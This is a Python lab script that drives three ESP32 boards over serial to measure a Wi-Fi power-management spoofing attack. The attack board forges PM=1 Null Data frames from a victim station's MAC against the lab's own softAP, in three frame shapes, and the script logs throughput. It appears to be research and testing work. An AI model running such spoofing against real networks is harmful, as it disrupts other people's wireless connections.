"""PS-Poll / power-management spoofing against a real link (three boards).

    python -u lab/pspoll_ps.py --attack COM5 --ap COM6 --sta COM10 --channel 6

Topology:

  COM6   ESP32     lab/rf_throughput `ap <ssid> <ch>`   -> softAP + TCP 4444 stream
  COM10  ESP32-C5  lab/rf_throughput `sta <ssid>`       -> downloads, PS controlled
  COM5   ESP32-CYD this firmware -> PSPOLL attack against that softAP

What each phase is for:

  baseline awake   ps 0, no attack. The link's ceiling.
  PM spoof         `PSPOLL <idx> <sta-mac>`: forged Null Data with PM=1 from the
                   station's MAC. The AP now believes the station sleeps and buffers
                   everything; the station is awake and never polls, so its download
                   should collapse. This is the attack's claim.
  release          `PSPOLLREL`: one PM=0 Null Data per victim, i.e. the undo. The AP
                   hands the buffered frames to a station that is still not
                   listening, then treats it as awake again -- the rate should come
                   back. This is the boundary: delayed/lost downlink, not a block.
  baseline ps      ps 1, no attack: a real power-saving station, for comparison.

Every board is `clear`+`reboot`ed first so a stored role cannot fight the run.

Reading the result: RATE is printed by each board once per second (KiB/s of the TCP
stream). The AP's number is the amount of air time it spends delivering, the
station's number is what actually arrived. An attack that only delays shows up as
"AP high, station low".
"""
import argparse
import statistics
import sys
import time

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

import serial


class Port:
    def __init__(self, port):
        self.name = port
        self.ser = serial.Serial(port, 115200, timeout=0.05, dsrdtr=False, rtscts=False)
        self.ser.dtr = False
        self.ser.rts = False
        self.pending = []
        time.sleep(0.3)
        self.ser.reset_input_buffer()

    def send(self, line):
        self.ser.write((line + "\r\n").encode())
        self.ser.flush()

    def read_line(self, timeout=0.05):
        if self.pending:
            return self.pending.pop(0)
        deadline = time.time() + timeout
        while time.time() < deadline:
            text = self.ser.readline().decode("utf-8", "replace").rstrip("\r\n")
            if text:
                return text
        return None

    def expect(self, prefix, timeout=10.0):
        if isinstance(prefix, str):
            prefix = (prefix,)
        deadline = time.time() + timeout
        while time.time() < deadline:
            text = self.read_line(0.1)
            if text is None:
                continue
            if text.startswith(tuple(prefix)):
                return text
        return None

    def close(self):
        try:
            self.ser.close()
        except Exception:  # noqa: BLE001
            pass


def reset_board(port):
    """Erase the stored role and reboot, so the board comes up idle and quiet."""
    p = Port(port)
    p.send("clear")
    p.expect("OK cleared", 3.0)
    p.send("reboot")
    p.expect("OK rebooting", 3.0)
    p.close()
    time.sleep(0.8)
    p = Port(port)
    return p, p.expect("INFO lab rf_throughput ready", 15.0)


def collect(seconds, ports):
    """Read every port for a while; return per-port RATE samples + disconnect count."""
    rates = {name: [] for name in ports}
    disconnects = 0
    sta_lines = []
    deadline = time.time() + seconds
    while time.time() < deadline:
        for name, port in ports.items():
            text = port.read_line(0.02)
            if text is None:
                continue
            if text.startswith("RATE kib="):
                try:
                    rates[name].append(int(text.split("kib=")[1].split()[0]))
                except (IndexError, ValueError):
                    pass
            elif name == "sta" and text.startswith("WIFI sta disconnected"):
                disconnects += 1
                sta_lines.append(text)
            elif name == "sta" and text.startswith("STA "):
                sta_lines.append(text)
    return rates, disconnects, sta_lines


def status_of(port):
    # The lab firmware compares the command verbatim (lowercase); the attack board
    # uppercases its input, this one does not.
    port.send("status")
    line = port.expect("STATUS ", 5.0)
    info = {}
    if line:
        for token in line.split(" ")[1:]:
            if "=" in token:
                key, value = token.split("=", 1)
                info[key] = value
    return info


def scan_for(attack, ssid, tries=3):
    for _ in range(tries):
        attack.send("SCAN")
        deadline = time.time() + 25
        index = None
        while time.time() < deadline:
            text = attack.read_line(0.1)
            if text is None:
                continue
            if text.startswith("NET "):
                parts = text.split(" ", 6)
                if len(parts) >= 7 and parts[6].strip() == ssid:
                    index = int(parts[1])
            if text.startswith("SCAN_END"):
                break
        if index is not None:
            return index
        time.sleep(1.0)
    return None


def phase(name, attack, seconds, ports, start_cmd=None, stop_cmd=None):
    print("\n--- %s" % name)
    if start_cmd:
        attack.send(start_cmd)
        printed = attack.expect(("OK ", "ERR "), 6.0)
        print("    %s -> %s" % (start_cmd, printed))
        if printed is None or printed.startswith("ERR"):
            return None
    rates, disconnects, sta_lines = collect(seconds, ports)
    ap_rates = rates.get("ap", [])
    sta_rates = rates.get("sta", [])
    for line in sta_lines:
        print("    sta:", line)
    print("    ap RATE  samples=%d mean=%.0f median=%.0f KiB/s"
          % (len(ap_rates), statistics.mean(ap_rates) if ap_rates else float("nan"),
             statistics.median(ap_rates) if ap_rates else float("nan")))
    print("    sta RATE samples=%d mean=%.0f KiB/s disconnects=%d"
          % (len(sta_rates), statistics.mean(sta_rates) if sta_rates else float("nan"),
             disconnects))
    if stop_cmd:
        attack.send(stop_cmd)
        stopped = attack.expect("OK ", 5.0)
        print("    %s -> %s" % (stop_cmd, stopped))
    return {"ap": ap_rates, "sta": sta_rates, "disconnects": disconnects}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--attack", default="COM5")
    ap.add_argument("--ap", default="COM6")
    ap.add_argument("--sta", default="COM10")
    ap.add_argument("--ssid", default="pspollab")
    ap.add_argument("--channel", type=int, default=6)
    ap.add_argument("--seconds", type=float, default=10.0)
    args = ap.parse_args()

    board_ap, ap_ready = reset_board(args.ap)
    board_sta, sta_ready = reset_board(args.sta)
    attack = Port(args.attack)
    try:
        print("ap ready:", ap_ready)
        print("sta ready:", sta_ready)
        board_ap.send("ap %s %d" % (args.ssid, args.channel))
        print("ap:", board_ap.expect("AP listening", 15.0) or "no answer")
        board_sta.send("sta %s" % args.ssid)
        print("sta:", board_sta.expect("WIFI sta joining", 10.0) or "no answer")
        board_sta.send("ps 0")
        print("sta:", board_sta.expect("OK ps=0", 5.0) or "ps not applied")
        print("sta:", board_sta.expect("WIFI sta got ip", 25.0) or "no ip")
        print("sta:", board_sta.expect("STA connected", 25.0) or "no TCP stream")

        sta_info = status_of(board_sta)
        victim = sta_info.get("mac", "")
        if not victim:
            print("station did not report its MAC; cannot name a victim")
            return 1
        print("victim MAC:", victim)

        # Leave whatever attack the previous run left running: a promiscuous board
        # with an attack armed does not scan cleanly.
        attack.send("STOP")
        attack.expect("OK STOP", 5.0)
        index = scan_for(attack, args.ssid)
        if index is None:
            print("attack board did not see the softAP '%s'" % args.ssid)
            return 1
        print("attack index=%d" % index)
        victim_token = victim.replace(":", "")

        ports = {"ap": board_ap, "sta": board_sta}
        results = {}
        results["baseline awake"] = phase("baseline awake (ps 0, no attack)", attack,
                                          args.seconds, ports)

        # Same attack, three carriers for the PM bit: stacks disagree about which
        # frame they honour, so each is measured against the same baseline.
        for shape in ("null", "qosnull", "action"):
            results[shape] = phase(
                "PM spoof, shape=%s" % shape, attack, args.seconds, ports,
                "PSPOLL %d %s %s" % (index, victim_token, shape))
            results[shape + " release"] = phase(
                "release after %s (PSPOLLREL: PM=0 sent)" % shape, attack, args.seconds,
                ports, "PSPOLLREL")

        info = status_of(attack)
        print("\nSTATUS psp=%s pspfrm=%s pspf=%s pspnul=%s pspfl=%s pspc=%s pspdl=%s "
              "psprxp=%s psprxn=%s psprxpm=%s txg=%s txgerr=%s"
              % (info.get("psp"), info.get("pspfrm"), info.get("pspf"), info.get("pspnul"),
                 info.get("pspfl"), info.get("pspc"), info.get("pspdl"), info.get("psprxp"),
                 info.get("psprxn"), info.get("psprxpm"), info.get("txg"),
                 info.get("txgerr")))

        base = results["baseline awake"]["ap"]
        base = statistics.mean(base) if base else float("nan")
        print("\nsummary (AP-side RATE KiB/s, 'baseline awake'=%.0f):" % base)
        for name in ("baseline awake", "null", "null release", "qosnull",
                     "qosnull release", "action", "action release"):
            res = results.get(name)
            if not res or not res["ap"]:
                continue
            mean = statistics.mean(res["ap"])
            sta_mean = statistics.mean(res["sta"]) if res["sta"] else float("nan")
            delta = (mean - base) / base * 100 if base else float("nan")
            print("  %-16s ap=%7.0f (%+6.1f%%)  sta=%7.0f  n=%2d  disconnects=%d"
                  % (name, mean, delta, sta_mean, len(res["ap"]), res["disconnects"]))
        return 0
    finally:
        for port in (board_ap, board_sta, attack):
            port.close()


if __name__ == "__main__":
    sys.exit(main())
